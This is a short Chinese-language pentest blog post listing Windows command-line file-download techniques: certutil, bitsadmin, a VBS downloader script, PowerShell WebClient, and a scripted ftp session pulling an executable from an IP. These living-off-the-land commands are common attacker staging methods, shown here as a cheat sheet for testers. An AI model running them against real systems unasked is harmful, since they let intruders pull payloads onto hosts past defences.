---
layout: post
title: WINDOWS CMD 命令行下载文件的几种方法
date: '2020-10-01 06:24:00'
tags:
- pentest
- windows
- cmd
- lolbin
- hash-import-2023-03-22-16-36
---

## certutil

    $ certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe

## bitsdmin

    $ bitsadmin /transfer taskname http://7-zip.org/a/7z1604-x64.exe c:\temp\7zip.exe

### Copy file

    $ bitsadmin /create taskname
    $ bitsadmin /addfile taskname c:\temp\7zip.exe c:\7zip.exe
    $ bitsadmin /resume taskname
    $ bitsadmin /complete taskname

## vbs

Windows 10 未测试成功。

    # 用echo写入
    On Error Resume Next
    Dim iRemote,iLocal
    iLocal = LCase(WScript.Arguments(1))
    iRemote = LCase(WScript.Arguments(0))
    Set xPost = createObject("Microsoft.XMLHTTP")
    xPost.Open "GET",iRemote,0
    xPost.Send()
    Set sGet = createObject("ADODB.Stream")
    sGet.Mode = 3
    sGet.Type = 1
    sGet.Open()
    sGet.Write(xPost.responseBody)
    sGet.SaveToFile iLocal,2

    $ cscript ff.vbs http://7-zip.org/a/7z1604-x64.exe 7zip.exe

## powershell

    $ powershell (new-object System.Net.WebClient).DownloadFile( 'http://7-zip.org/a/7z1604-x64.exe','c:\temp\7zip.exe')

## ftp

    $ echo open 8.8.8.8 > a.txt & echo get fuck.exe>>a.txt & echo bye>>a.txt
    $ ftp -A -s:a.txt

> [Bitsadmin.exe](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)

> [Windows for Pentester: BITSAdmin](https://www.hackingarticles.in/windows-for-pentester-bitsadmin/)

> [cmd 环境下载文件的几种方法](https://www.jianshu.com/p/afb1e7b8acaf)

